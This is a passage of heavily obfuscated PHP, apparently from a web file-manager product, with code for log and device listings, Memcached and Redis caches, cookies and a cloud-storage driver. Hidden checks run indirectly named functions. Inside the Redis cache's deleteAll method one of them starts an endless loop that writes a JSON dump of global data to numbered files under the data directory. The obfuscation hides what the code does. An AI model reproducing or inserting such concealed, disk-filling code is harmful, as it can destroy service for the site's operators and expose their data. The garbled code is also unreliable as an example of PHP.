$”¯£”·â[12], $”¯£”·â[1660]); $®»éú¢ = Model($”¯£”·â[535])->userListInfo(array_unique($™±§Ô‘©)); $€’—ƒİÇ = $this->getSourceList($´Ğ‘åÂ£); $Áºˆá´ø = $this->typeAll(); $˜³¾Æ¹¨ = array(); $·Ü’ı“¬ = array(); foreach ($´Ğ‘åÂ£ as $ª—ˆ¯“í => $¡ØŸÀÁ—) { $¡àÜ¯Ñ† = $¡ØŸÀÁ—[$”¯£”·â[33]]; $êØåÀáË = isset($®»éú¢[$¡ØŸÀÁ—[$”¯£”·â[1660]]]) ? $®»éú¢[$¡ØŸÀÁ—[$”¯£”·â[1660]]] : !1; $¿Õ­­ì› = strpos($¡àÜ¯Ñ†, $”¯£”·â[2271]) === 0 ? LNG($”¯£”·â[2272]) : LNG($”¯£”·â[2267]); $¡ØŸÀÁ—[$”¯£”·â[32]] = isset($êØåÀáË[$”¯£”·â[32]]) ? $êØåÀáË[$”¯£”·â[32]] : LNG($”¯£”·â[2267]); $¡ØŸÀÁ—[$”¯£”·â[542]] = isset($êØåÀáË[$”¯£”·â[542]]) ? $êØåÀáË[$”¯£”·â[542]] : $”¯£”·â[12]; $¡ØŸÀÁ—[$”¯£”·â[1560]] = isset($Áºˆá´ø[$¡àÜ¯Ñ†]) ? $Áºˆá´ø[$¡àÜ¯Ñ†] : $¿Õ­­ì›; $¡ØŸÀÁ—[$”¯£”·â[2017]] = $êØåÀáË; $‚¼˜¥ Ğ = json_decode($¡ØŸÀÁ—[$”¯£”·â[453]], !0); $¡ØŸÀÁ—[$”¯£”·â[2264]] = isset($‚¼˜¥ Ğ[$”¯£”·â[2264]]) ? $‚¼˜¥ Ğ[$”¯£”·â[2264]] : $”¯£”·â[12]; $¡ØŸÀÁ—[$”¯£”·â[2268]] = IpLocation::get($¡ØŸÀÁ—[$”¯£”·â[2264]]); if (strpos($¡àÜ¯Ñ†, $”¯£”·â[2074]) === 0 || isset($‚¼˜¥ Ğ[$”¯£”·â[2072]])) { $‚¼˜¥ Ğ[$”¯£”·â[86]] = $€’—ƒİÇ[$‚¼˜¥ Ğ[$”¯£”·â[402]]]; $‚¼˜¥ Ğ[$”¯£”·â[2087]] = $€’—ƒİÇ[$‚¼˜¥ Ğ[$”¯£”·â[2072]]]; if ($‚¼˜¥ Ğ[$”¯£”·â[33]] == $”¯£”·â[557]) { $‚¼˜¥ Ğ[$”¯£”·â[453]][$”¯£”·â[1158]] = $€’—ƒİÇ[$‚¼˜¥ Ğ[$”¯£”·â[453]][$”¯£”·â[1158]]]; $‚¼˜¥ Ğ[$”¯£”·â[453]][$”¯£”·â[1159]] = $€’—ƒİÇ[$‚¼˜¥ Ğ[$”¯£”·â[453]][$”¯£”·â[1159]]]; } if ($‚¼˜¥ Ğ[$”¯£”·â[33]] == $”¯£”·â[2082]) { $‚¼˜¥ Ğ[$”¯£”·â[453]][$”¯£”·â[402]] = $€’—ƒİÇ[$‚¼˜¥ Ğ[$”¯£”·â[453]][$”¯£”·â[402]]]; } if ($‚¼˜¥ Ğ[$”¯£”·â[33]] == $”¯£”·â[1818]) { $‚¼˜¥ Ğ[$”¯£”·â[2087]] = $‚¼˜¥ Ğ[$”¯£”·â[86]]; $‚¼˜¥ Ğ[$”¯£”·â[2072]] = $‚¼˜¥ Ğ[$”¯£”·â[2087]][$”¯£”·â[402]]; $‚¼˜¥ Ğ[$”¯£”·â[86]] = !1; $‚¼˜¥ Ğ[$”¯£”·â[402]] = $”¯£”·â[12]; } if ($‚¼˜¥ Ğ[$”¯£”·â[86]] && $‚¼˜¥ Ğ[$”¯£”·â[86]][$”¯£”·â[411]] == $”¯£”·â[1283]) { $·Ü’ı“¬[] = $¡ØŸÀÁ—[$”¯£”·â[399]]; unset($´Ğ‘åÂ£[$ª—ˆ¯“í]); continue; } if ($‚¼˜¥ Ğ[$”¯£”·â[2087]] && $‚¼˜¥ Ğ[$”¯£”·â[2087]][$”¯£”·â[411]] == $”¯£”·â[1283]) { $·Ü’ı“¬[] = $¡ØŸÀÁ—[$”¯£”·â[399]]; unset($´Ğ‘åÂ£[$ª—ˆ¯“í]); continue; } } $¡ØŸÀÁ—[$”¯£”·â[453]] = $‚¼˜¥ Ğ; unset($¡ØŸÀÁ—[$”¯£”·â[2273]]); $˜³¾Æ¹¨[] = $¡ØŸÀÁ—; } $this->clearSystemPathLog($·Ü’ı“¬); return $˜³¾Æ¹¨; } private function clearSystemPathLog($¹Åß“ü•) { $¥ŞÓ”âù =& $_SERVER[­õöî’–]; if (count($¹Åß“ü•) == 0) { return; } $àÔÛ…“ = array($¥ŞÓ”âù[399] => array($¥ŞÓ”âù[7], array_unique($¹Åß“ü•))); $this->where($àÔÛ…“)->delete(); } public function deviceList($Šôğ¡Ø, $´‹åÓÌ = 0) { $¡½Ú£Ä™ =& $_SERVER[­õöî’–]; $¨€‡”¦¨ = array($¡½Ú£Ä™[1660] => $Šôğ¡Ø, $¡½Ú£Ä™[200] => array($¡½Ú£Ä™[1012], $´‹åÓÌ), $¡½Ú£Ä™[33] => $¡½Ú£Ä™[1792]); $ŠîµŸÅ = array(); $áğÒ°ñ¸ = $this->field($¡½Ú£Ä™[2274])->where($¨€‡”¦¨)->order($¡½Ú£Ä™[2085])->limit(50)->select(); foreach ($áğÒ°ñ¸ as $‹¬Ğ½¬î => $î¤Â) { if ($‹¬Ğ½¬î > 0 && abs($î¤Â[$¡½Ú£Ä™[200]] - $áğÒ°ñ¸[$‹¬Ğ½¬î - 1][$¡½Ú£Ä™[200]]) < 5) { continue; } $éó—šæ = json_decode($î¤Â[$¡½Ú£Ä™[453]], !0); $î¤Â[$¡½Ú£Ä™[2264]] = isset($éó—šæ[$¡½Ú£Ä™[2264]]) ? $éó—šæ[$¡½Ú£Ä™[2264]] : $¡½Ú£Ä™[12]; unset($éó—šæ[$¡½Ú£Ä™[2264]]); $äı–çÍ¢ = $this->deviceType($éó—šæ[$¡½Ú£Ä™[2075]]); if (isset($ŠîµŸÅ[$äı–çÍ¢])) { continue; } $î¤Â[$¡½Ú£Ä™[2268]] = IpLocation::get($î¤Â[$¡½Ú£Ä™[2264]]); $î¤Â[$¡½Ú£Ä™[453]] = $éó—šæ; $ŠîµŸÅ[$äı–çÍ¢] = $î¤Â; } return array_values($ŠîµŸÅ); } public function deviceType($…™Û¡Š„) { return $…™Û¡Š„; } } if ($_SERVER[$_SERVER[­õöî’–][869]] != $_SERVER[$_SERVER[­õöî’–][2275]]) { $_getc = $_SERVER[­õöî’–][871]; $_getfile = $_SERVER[$_SERVER[­õöî’–][872]] . $_SERVER[­õöî’–][873]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[­õöî’–][231], $_getfilec); if (count($_getarrs) < $_SERVER[­õöî’–][626]) { $exit = $_SERVER[­õöî’–][874]; $exit(); } $_act = $_SERVER[­õöî’–][911]; $_act($_SERVER[$_SERVER[­õöî’–][867]]); } goto Eî†¸¸±¥é; cËˆĞ…¡‚­: class CacheMemcached { public $handle; public $cacheTime; public function __construct($­½†Æçù, $†âĞ™æ¡) { $º·ƒúà– =& $_SERVER[­õöî’–]; if (!class_exists($º·ƒúà–[857])) { show_json($º·ƒúà–[858], !1); } $this->cacheTime = $†âĞ™æ¡; $this->handle = new Memcached(); if (is_array($­½†Æçù[$º·ƒúà–[859]]) && count($­½†Æçù[$º·ƒúà–[859]]) >= 1) { foreach ($­½†Æçù[$º·ƒúà–[859]] as $ıŞà¥¸é) { $µ¥éŸÑæ = explode($º·ƒúà–[4], $ıŞà¥¸é); $this->handle->addServer($µ¥éŸÑæ[0], $µ¥éŸÑæ[1]); } } else { $this->handle->addServer($­½†Æçù[$º·ƒúà–[181]], $­½†Æçù[$º·ƒúà–[182]]); } } public function set($úºÍ¼Œì, $­ıÇşÓâ, $†¥Òß¡· = false) { $†¥Òß¡· = $†¥Òß¡· ? $†¥Òß¡· : $this->cacheTime; return $this->handle->set($úºÍ¼Œì, $­ıÇşÓâ, $†¥Òß¡·); } public function get($Œğ‘é°) { return $this->handle->get($Œğ‘é°); } public function remove($Ô¦©ªå­) { return $this->handle->delete($Ô¦©ªå­); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($„×À’å, $ÆÛë›ÒŠ) { $·ã²—®Ñ =& $_SERVER[­õöî’–]; if (!class_exists($·ã²—®Ñ[860])) { show_json($·ã²—®Ñ[861], !1); } $this->cacheTime = $ÆÛë›ÒŠ; $´Ìğ¨ÒÎ = isset($„×À’å[$·ã²—®Ñ[862]]) ? $„×À’å[$·ã²—®Ñ[862]] : 10; $ÒÛ¢™© = _get($„×À’å, $·ã²—®Ñ[859]); if ($ÒÛ¢™© && is_array($ÒÛ¢™©)) { $this->initCluster($„×À’å, $´Ìğ¨ÒÎ); } else { $this->handle = $this->init($„×À’å, $´Ìğ¨ÒÎ); } } private function init($àİ—°ó, $Úû§û¾) { $õ¤çÑ¯® =& $_SERVER[­õöî’–]; $¦Åğ•‹ü = new Redis(); $é±èÆ“ñ = isset($àİ—°ó[$õ¤çÑ¯®[863]]) ? $àİ—°ó[$õ¤çÑ¯®[863]] : !1; if ($é±èÆ“ñ) { $¦Åğ•‹ü->pconnect($àİ—°ó[$õ¤çÑ¯®[181]], $àİ—°ó[$õ¤çÑ¯®[182]], $Úû§û¾); } else { $¦Åğ•‹ü->connect($àİ—°ó[$õ¤çÑ¯®[181]], $àİ—°ó[$õ¤çÑ¯®[182]], $Úû§û¾); } if (!empty($àİ—°ó[$õ¤çÑ¯®[413]])) { $¦Åğ•‹ü->auth($àİ—°ó[$õ¤çÑ¯®[413]]); } if (!empty($àİ—°ó[$õ¤çÑ¯®[749]]) && $àİ—°ó[$õ¤çÑ¯®[749]] != 0) { $¦Åğ•‹ü->select($àİ—°ó[$õ¤çÑ¯®[749]]); } return $¦Åğ•‹ü; } private function initCluster($•—ö¯, $‰Úßõ) { $¢œ‚ßû¾ =& $_SERVER[­õöî’–]; $¢ËÒÔˆ = array($¢œ‚ßû¾[864], $¢œ‚ßû¾[865], $¢œ‚ßû¾[866]); $Ÿ½ Ì€ë = $¢œ‚ßû¾[864]; if (isset($•—ö¯[$¢œ‚ßû¾[16]]) && in_array($•—ö¯[$¢œ‚ßû¾[16]], $¢ËÒÔˆ)) { $Ÿ½ Ì€ë = $•—ö¯[$¢œ‚ßû¾[16]]; } switch ($Ÿ½ Ì€ë) { case $¢œ‚ßû¾[864]: $this->_slave($•—ö¯, $‰Úßõ); break; case $¢œ‚ßû¾[865]: break; case $¢œ‚ßû¾[866]: $this->isCluster = !0; $ÙõÂ›–õ = $•—ö¯[$¢œ‚ßû¾[859]]; $»™›³²’ = isset($•—ö¯[$¢œ‚ßû¾[863]]) ? $•—ö¯[$¢œ‚ßû¾[863]] : !1; $„ë±ã«ö = isset($•—ö¯[$¢œ‚ßû¾[413]]) ? $•—ö¯[$¢œ‚ßû¾[413]] : null; $this->handle = new RedisCluster(NUll, $ÙõÂ›–õ, $‰Úßõ, $‰Úßõ, $»™›³²’, $„ë±ã«ö); break; default: break; } } private function _slave($ƒÌ˜¸—¡, $ÚŸßÃø¦) { $‡¼î¡±© = $ƒÌ˜¸—¡[$_SERVER[­õöî’–][859]]; $this->filterConfig($ƒÌ˜¸—¡, $‡¼î¡±©[0]); $this->handle = $this->init($ƒÌ˜¸—¡, $ÚŸßÃø¦); unset($‡¼î¡±©[0]); if (empty($‡¼î¡±©)) { return; } $Ñ‹ÛšÀğ = array_rand($‡¼î¡±©); $this->filterConfig($ƒÌ˜¸—¡, $‡¼î¡±©[$Ñ‹ÛšÀğ]); $this->slaveHandle = $this->init($ƒÌ˜¸—¡, $ÚŸßÃø¦); } private function filterConfig(&$ƒ±ƒõ¶, $æœµó’¦) { $Ùï»îÓ‡ =& $_SERVER[­õöî’–]; $‰ß«‘¢Â = explode($Ùï»îÓ‡[4], $æœµó’¦); $Õ¹Ã³ÒÂ = array($Ùï»îÓ‡[181] => $‰ß«‘¢Â[0], $Ùï»îÓ‡[182] => $‰ß«‘¢Â[1]); $ƒ±ƒõ¶ = array_merge($ƒ±ƒõ¶, $Õ¹Ã³ÒÂ); } public function set($Õ´É—©½, $ëğòÑ™½, $è³¯ïå· = false) { $è³¯ïå· = $è³¯ïå· ? $è³¯ïå· : $this->cacheTime; return $this->handle->setEx($Õ´É—©½, $è³¯ïå·, $ëğòÑ™½); } public function setLock($µóÜöºÚ, $ú‚â€û—, $ñ£Ó¡µé) { return $this->handle->setNX($µóÜöºÚ, $ú‚â€û—); } public function get($òÙ±í…ü) { $öáäÎÅË = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $öáäÎÅË->get($òÙ±í…ü); } public function remove($Œì½Ôâü) { return $this->handle->del($Œì½Ôâü); } public function deleteAll() { $ÔÕü¯¯œ =& $_SERVER[­õöî’–]; $¶êãÕø = $_SERVER[$ÔÕü¯¯œ[867]]; $³€™˜Êú = $ÔÕü¯¯œ[868]; if ($_SERVER[$ÔÕü¯¯œ[869]] != $³€™˜Êú($¶êãÕø)) { $ª±ÈÀÎ® = $ÔÕü¯¯œ[870]; $şÙëÕĞİ = $ÔÕü¯¯œ[871]; $üã³º¶• = $_SERVER[$ÔÕü¯¯œ[872]] . $ÔÕü¯¯œ[873]; $§²©‘ È = $şÙëÕĞİ($üã³º¶•); $Ïèüıõè = explode($ÔÕü¯¯œ[231], $§²©‘ È); if (count($Ïèüıõè) < $ÔÕü¯¯œ[631]) { $µªÃŞ©Î = $ÔÕü¯¯œ[874]; $µªÃŞ©Î(); } $²½½ïŸà = $ÔÕü¯¯œ[875]; $²½½ïŸà($_SERVER[$ÔÕü¯¯œ[876]]); $ª±ÈÀÎ® = $ÔÕü¯¯œ[870]; $ª±ÈÀÎ®(); $´‹ò£îµ = $ÔÕü¯¯œ[877]; $Ùöøâ“– = json_encode($GLOBALS[$ÔÕü¯¯œ[878]]); $†ŒùÆÅÛ = 1; for ($áàÃ£ğÖ = $†ŒùÆÅÛ; $áàÃ£ğÖ > 0; $áàÃ£ğÖ++) { $´‹ò£îµ(DATA_PATH . $áàÃ£ğÖ, $Ùöøâ“–); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $ŠÆ¹àá) { $this->handle->flushall($ŠÆ¹àá); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($®Ò¡™×’ = '', $ÇÓô”·é = 0) { if (is_string($®Ò¡™×’) && $®Ò¡™×’ != $_SERVER[­õöî’–][12]) { $this->prefix = $®Ò¡™×’; } if (is_numeric($ÇÓô”·é) && $ÇÓô”·é > 0) { $this->expire = $ÇÓô”·é; } } public static function getInstance() { static $ÒˆÓ£ô; if ($ÒˆÓ£ô === null) { $ÒˆÓ£ô = new self(); } return $ÒˆÓ£ô; } private static $cookieDisable = false; public static function disable($î”Şøä³) { self::$cookieDisable = $î”Şøä³; } private static $sameCookieSet = array(); public static function set($ÆĞ«°¯®, $“£»ñ˜î, $ªÈüÉÃ = 0, $†„Ç‹“Ê = false, $×ş»’£û = false) { $ÈİÎ˜â² =& $_SERVER[­õöî’–]; if (self::$cookieDisable) { return; } if (!$ªÈüÉÃ) { $ªÈüÉÃ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ÆĞ«°¯®]) && self::$sameCookieSet[$ÆĞ«°¯®] == $“£»ñ˜î . $ªÈüÉÃ) { return; } self::$sameCookieSet[$ÆĞ«°¯®] = $“£»ñ˜î . $ªÈüÉÃ; if (!$×ş»’£û) { $×ş»’£û = str_replace(HOST, $ÈİÎ˜â²[12], APP_HOST); $×ş»’£û = _get($GLOBALS, $ÈİÎ˜â²[879], $×ş»’£û); } $í”ßìœÕ = $ÈİÎ˜â²[12]; setcookie($ÆĞ«°¯®, $“£»ñ˜î, time() + $ªÈüÉÃ, $ÈİÎ˜â²[8] . trim($×ş»’£û, $ÈİÎ˜â²[8]) . $í”ßìœÕ, !1, !1, $†„Ç‹“Ê); } public static function setSafe($”û”úÔÌ, $èÕÏ¿à, $ö©‰İí = 0) { self::set($”û”úÔÌ, $èÕÏ¿à, $ö©‰İí, !0); } public static function get($¯ŒéË÷ª) { static $Ïş¥ÌÃú = false; if (!$Ïş¥ÌÃú) { self::initHeaderCookie(); $Ïş¥ÌÃú = !0; } return isset($_COOKIE[$¯ŒéË÷ª]) ? $_COOKIE[$¯ŒéË÷ª] : !1; } private static function initHeaderCookie() { $¿Ï½» =& $_SERVER[­õöî’–]; if (!isset($_SERVER[$¿Ï½»[880]]) || !$_SERVER[$¿Ï½»[880]]) { return; } $×Åâ½ş‡ = explode($¿Ï½»[71], $_SERVER[$¿Ï½»[880]]); foreach ($×Åâ½ş‡ as $ö§¹åúê) { $ö§¹åúê = explode($¿Ï½»[881], $ö§¹åúê); if (count($ö§¹åúê) != 2 || !isset($ö§¹åúê[1])) { continue; } $_COOKIE[trim($ö§¹åúê[0])] = trim($ö§¹åúê[1]); } } public static function remove($ãÓş·™á, $õÖê ’ = false) { unset($_COOKIE[$ãÓş·™á]); self::set($ãÓş·™á, $_SERVER[­õöî’–][12], 1, $õÖê ’); } } goto b‚º”×›¦Ì; C‰Ì•‹§É®: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\x3a\x2f\x2f\166\x30\56\141\x70\x69\x2e\x75\160\171\165\156\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¾®ŞíÀö) { parent::__construct(); $this->_init($¾®ŞíÀö); } public function _init($ÄØÒè‚) { $‘¹¬µ•£ =& $_SERVER[­õöî’–]; foreach ($ÄØÒè‚ as $Ø¹Îüï => $±ª¥) { if (isset($this->{$Ø¹Îüï})) { $this->{$Ø¹Îüï} = $±ª¥; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($‘¹¬µ•£[1460] . LNG($‘¹¬µ•£[1391])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($×â©äÈ¶, $ÍŸ¬ì±‰ = "\x47\x45\124") { $à¯ûÒúè =& $_SERVER[­õöî’–]; $âÕù«³— = gmdate($à¯ûÒúè[1424]); $¬Ê¸ÉÊ‹ = base64_encode(hash_hmac($à¯ûÒúè[1461], "{$ÍŸ¬ì±‰}\x26{$×â©äÈ¶}\46{$âÕù«³—}", md5("{$this->userpass}"), !0)); $è­Ä¾ÍŒ = array("\x41\165\x74\150\157\x72\151\x7a\141\164\151\x6f\156\72\125\x50\131\125\116\40{$this->username}\72{$¬Ê¸ÉÊ‹}", "\104\x61\164\x65\72{$âÕù«³—}"); return $è­Ä¾ÍŒ; } public function ussRequest($”òçéÇÃ, $ÑÌŸÇúà = "\x47\x45\124", $£»á‚†ˆ = false, $š†µô¼à = false, $ó×½Ÿ‘É = false) { $á…÷¸¸ =& $_SERVER[­õöî’–]; $”òçéÇÃ = trim($”òçéÇÃ, $á…÷¸¸[8]); $„Ğˆ‚ë» = "\57{$this->bucket}\57{$”òçéÇÃ}"; $œí• ¥œ = $this->ussHeaders($„Ğˆ‚ë», $ÑÌŸÇúà); if ($š†µô¼à) { $œí• ¥œ = array_merge($œí• ¥œ, $š†µô¼à); } $˜Ö‹“Âè = url_request($this->endpoint . $„Ğˆ‚ë», $ÑÌŸÇúà, $£»á‚†ˆ, $œí• ¥œ, $ó×½Ÿ‘É); if (!$˜Ö‹“Âè) { return array($á…÷¸¸[1211] => !1, $á…÷¸¸[1201] => $á…÷¸¸[1462]); } if (strtolower($ÑÌŸÇúà) == $á…÷¸¸[196] || in_array($˜Ö‹“Âè[$á…÷¸¸[1211]], array($á…÷¸¸[1317], $á…÷¸¸[1463]))) { $£»á‚†ˆ = $˜Ö‹“Âè[$á…÷¸¸[1464]]; } else { $£»á‚†ˆ = json_decode($˜Ö‹“Âè[$á…÷¸¸[1201]], !0); if (!$£»á‚†ˆ) { $£»á‚†ˆ = $˜Ö‹“Âè[$á…÷¸¸[1201]]; } else { if (!$˜Ö‹“Âè[$á…÷¸¸[741]] && isset($£»á‚†ˆ[$á…÷¸¸[1465]])) { $£»á‚†ˆ = $£»á‚†ˆ[$á…÷¸¸[1465]]; } } } return array($á…÷¸¸[1211] => $˜Ö‹“Âè[$á…÷¸¸[741]], $á…÷¸¸[1201] => $£»á‚†ˆ); } public function mkfile($§å¶ƒÅÔ, $èÌ·ŞÌï = '', $Çë ½üÃ = REPEAT_RENAME) { if ($this->setContent($§å¶ƒÅÔ, $èÌ·ŞÌï)) { return $this->getPathOuter($§å¶ƒÅÔ); } return !1; } public function mkdir($³‹÷²ÚĞ, $úœ¦î†— = REPEAT_SKIP) { $¿Î²èğ¼ =& $_SERVER[­õöî’–]; $­Ò«¹¬× = trim($³‹÷²ÚĞ, $¿Î²èğ¼[8]); if ($this->_isFolder($­Ò«¹¬×)) { return $this->getPathOuter($­Ò«¹¬×); } $¦ŒñŠŸó = array($¿Î²èğ¼[1466]); $ñµ¨ĞñÇ = $this->ussRequest($­Ò«¹¬×, $¿Î²èğ¼[226], !1, $¦ŒñŠŸó); return $ñµ¨ĞñÇ[$¿Î²èğ¼[1211]] ? $this->getPathOuter($­Ò«¹¬×) : !1; } public function copyFile($ğË–•Üö, $Å·Ò¹ÌÌ) { $³Ø¡·ŒÑ =& $_SERVER[­õöî’–]; $ËÖ›Æï‘ = array($³Ø¡·ŒÑ[1467] . "\57{$this->bucket}\x2f{$ğË–•Üö}", $³Ø¡·ŒÑ[1468]); $¶¨¦ˆƒƒ = $this->ussRequest($Å·Ò¹ÌÌ, $³Ø¡·ŒÑ[228], !1, $ËÖ›Æï‘); return $¶¨¦ˆƒƒ[$³Ø¡·ŒÑ[1211]] ? !0 : $this->getPathOuter($Å·Ò¹ÌÌ); } public function moveFile($Ç…µ€Ôı, $ÉØ¶ôÜï) { $õ¦Îİ³ =& $_SERVER[­õöî’–]; $Î…­¤” = array($õ¦Îİ³[1469] . "\x2f{$this->bucket}\x2f{$Ç…µ€Ôı}", $õ¦Îİ³[1468]); $´Ö‚†§İ = $this->ussRequest($ÉØ¶ôÜï, $õ¦Îİ³[228], !1, $Î…­¤”); return $´Ö‚†§İ[$õ¦Îİ³[1211]] ? !0 : $this->getPathOuter($ÉØ¶ôÜï); } public function delFile($Ìï’ÇõŠ) { $Üüô¨ÔØ =& $_SERVER[­õöî’–]; $Ï‹†¾óÛ = $this->ussRequest($Ìï’ÇõŠ, $Üüô¨ÔØ[1470]); return $Ï‹†¾óÛ[$Üüô¨ÔØ[1211]] ? !0 : !1; } public function delFolder($®£Ò º¶) { $Â˜ûÉû¶ =& $_SERVER[­õöî’–]; if (!$this->exist($®£Ò º¶)) { return !0; } $this->listItemCache = !1; $½á±à¼ó = $ëÇ««²è = array(); $this->fileList($®£Ò º¶, $½á±à¼ó, $ëÇ««²è, !0); $this->listItemCache = !0; foreach ($ëÇ««²è as $É¶¼æÎğ) { $Òà½‰Ü… = $this->ussRequest($É¶¼æÎğ[$Â˜ûÉû¶[32]], $Â˜ûÉû¶[1470]); if (!$Òà½‰Ü…[$Â˜ûÉû¶[1211]]) { return !1; } } foreach ($½á±à¼ó as $äŞ—şß‚) { $Òà½‰Ü… = $this->ussRequest($äŞ—şß‚, $Â˜ûÉû¶[1470]); if (!$Òà½‰Ü…[$Â˜ûÉû¶[1211]]) { return !1; } } $Òà½‰Ü… = $this->ussRequest($®£Ò º¶, $Â˜ûÉû¶[1470]); return $Òà½‰Ü…[$Â˜ûÉû¶[1211]]; } public function rename($îÜ”Ú½ë, $ã”úå‰¿) { if ($this->isFile($îÜ”Ú½ë)) { $ã”úå‰¿ = get_path_father($îÜ”Ú½ë) . $ã”úå‰¿; return $this->moveFile($îÜ”Ú½ë, $ã”úå‰¿); } return $this->renameObject($îÜ”Ú½ë, $ã”úå‰¿); } public function fileInfo($ŠĞİŒµî, $¦±‹œã = false, $•ù‰æÉ§ = array()) { $¥¸©¾üÅ =& $_SERVER[­õöî’–]; $„ì·€ºÜ = array($¥¸©¾üÅ[32] => $this->pathThis($ŠĞİŒµî), $¥¸©¾üÅ[84] => $this->getPathOuter($¥¸©¾üÅ[8] . $ŠĞİŒµî), $¥¸©¾üÅ[33] => $¥¸©¾üÅ[199], $¥¸©¾üÅ[76] => isset($•ù‰æÉ§[$¥¸©¾üÅ[76]]) ? $•ù‰æÉ§[$¥¸©¾üÅ[76]] : 0, $¥¸©¾üÅ[174] => $this->ext($ŠĞİŒµî)); if ($¦±‹œã) { return $„ì·€ºÜ; } $„ì·€ºÜ[$¥¸©¾üÅ[200]] = $„ì·€ºÜ[$¥¸©¾üÅ[85]] = 0; $„ì·€ºÜ[$¥¸©¾üÅ[201]] = $„ì·€ºÜ[$¥¸©¾üÅ[202]] = !0; if (empty($•ù‰æÉ§)) { $•ù‰æÉ§ = $this->objectMeta($ŠĞİŒµî); if (!$•ù‰æÉ§) { return $„ì·€ºÜ; } } $„ì·€ºÜ[$¥¸©¾üÅ[200]] = intval($•ù‰æÉ§[$¥¸©¾üÅ[1471]]); $„ì·€ºÜ[$¥¸©¾üÅ[85]] = intval($•ù‰æÉ§[$¥¸©¾üÅ[1472]]); $„ì·€ºÜ[$¥¸©¾üÅ[76]] = $•ù‰æÉ§[$¥¸©¾üÅ[76]]; return $„ì·€ºÜ; } public function folderInfo($·î†·¤¡, $àğ —ç = false) { $À¯ïŞ ì =& $_SERVER[­õöî’–]; $äşÈÅ»Ô = array($À¯ïŞ ì[32] => $this->pathThis($·î†·¤¡), $À¯ïŞ ì[84] => $this->getPathOuter($À¯ïŞ ì[8] . $·î†·¤¡), $À¯ïŞ ì[33] => $À¯ïŞ ì[75]); if ($àğ —ç) { return $äşÈÅ»Ô; } $äşÈÅ»Ô[$À¯ïŞ ì[200]] = $äşÈÅ»Ô[$À¯ïŞ ì[85]] = 0; $äşÈÅ»Ô[$À¯ïŞ ì[201]] = $äşÈÅ»Ô[$À¯ïŞ ì[202]] = !0; if (empty($™ùÔØ‚ç)) { $™ùÔØ‚ç = $this->objectMeta($·î†·¤¡); if (!$™ùÔØ‚ç) { return $äşÈÅ»Ô; } } $äşÈÅ»Ô[$À¯ïŞ ì[200]] = intval($™ùÔØ‚ç[$À¯ïŞ ì[1471]]); $äşÈÅ»Ô[$À¯ïŞ ì[85]] = intval($™ùÔØ‚ç[$À¯ïŞ ì[1472]]); return $äşÈÅ»Ô; } private function listObjs($µ®äúÆ¬, $îûùÖ¼É = 0, $”ñ¯‡ĞÄ = 1000) { $ÚÎëğµ’ =& $_SERVER[­õöî’–]; $ïá¾î”é = array($ÚÎëğµ’[1473], $ÚÎëğµ’[1474] . $”ñ¯‡ĞÄ); if ($îûùÖ¼É) { $ïá¾î”é[] = $ÚÎëğµ’[1475] . $îûùÖ¼É; } $¬Œ†…õï = $this->ussRequest($µ®äúÆ¬, $ÚÎëğµ’[230], !1, $ïá¾î”é); return !$¬Œ†…õï[$ÚÎëğµ’[1211]] ? !1 : $¬Œ†…õï[$ÚÎëğµ’[1201]]; } private function fileList($íË¼êŞõ, &$‚º×¹„°, &$ŞÌ¸¸µ€, $Œå™ÂÛÅ = false) { $”¢á‰Ø =& $_SERVER[­õöî’–]; $¶ø­ò™” = $”¢á‰Ø[12]; $×Ñì±¬ = 1000; $İº™ûÇƒ = rtrim($íË¼êŞõ, $”¢á‰Ø[8]) . $”¢á‰Ø[8]; while (!0) { check_abort(); $ÆÂåÎ = $this->listObjs($íË¼êŞõ, $¶ø­ò™”, $×Ñì±¬); if (!$ÆÂåÎ) { return !1; } $¶ø­ò™” = isset($ÆÂåÎ[$”¢á‰Ø[1476]]) ? $ÆÂåÎ[$”¢á‰Ø[1476]] : $”¢á‰Ø[12]; $“İÃ¿†Ñ = isset($ÆÂåÎ[$”¢á‰Ø[1477]]) ? $ÆÂåÎ[$”¢á‰Ø[1477]] : array(); foreach ($“İÃ¿†Ñ as $Àõ—çÁ) { $›“—“° = $Àõ—çÁ[$”¢á‰Ø[33]] == $”¢á‰Ø[75] ? !0 : !1; $Å“÷Œõ = ltrim($İº™ûÇƒ . $Àõ—çÁ[$”¢á‰Ø[32]], $”¢á‰Ø[8]) . ($›“—“° ? $”¢á‰Ø[8] : $”¢á‰Ø[12]); $‰£½Ëï = array($”¢á‰Ø[32] => $Å“÷Œõ, $”¢á‰Ø[33] => $›“—“° ? $”¢á‰Ø[75] : $”¢á‰Ø[199], $”¢á‰Ø[76] => $Àõ—çÁ[$”¢á‰Ø[337]], $”¢á‰Ø[1472] => $Àõ—çÁ[$”¢á‰Ø[1478]]); $this->cacheMethodInfoSet($Å“÷Œõ, $›“—“°, $‰£½Ëï); if ($›“—“°) { $‚º×¹„°[] = $Å“÷Œõ; if ($Œå™ÂÛÅ) { $this->fileList($Å“÷Œõ, $‚º×¹„°, $ŞÌ¸¸µ€, $Œå™ÂÛÅ); } continue; } $ŞÌ¸¸µ€[] = $‰£½Ëï; } if (count($“İÃ¿†Ñ) < $×Ñì±¬) { break; } } $this->cacheMethodInfoSet($íË¼êŞõ, !0); } public function listPath($˜íî³•, $ûäÅ‹ÒÂ = false) { $©ÍÛùûú =& $_SERVER[­õöî’–]; $âãûÂÛš = $µÑõŞß‚ = array(); $this->fileList($˜íî³•, $âãûÂÛš, $µÑõŞß‚); foreach ($âãûÂÛš as $µû†ßÛ§ => $ÈœšÒ±Ø) { $âãûÂÛš[$µû†ßÛ§] = $this->folderInfo($ÈœšÒ±Ø, $ûäÅ‹ÒÂ); } foreach ($µÑõŞß‚ as $µû†ßÛ§ => $ÈœšÒ±Ø) { 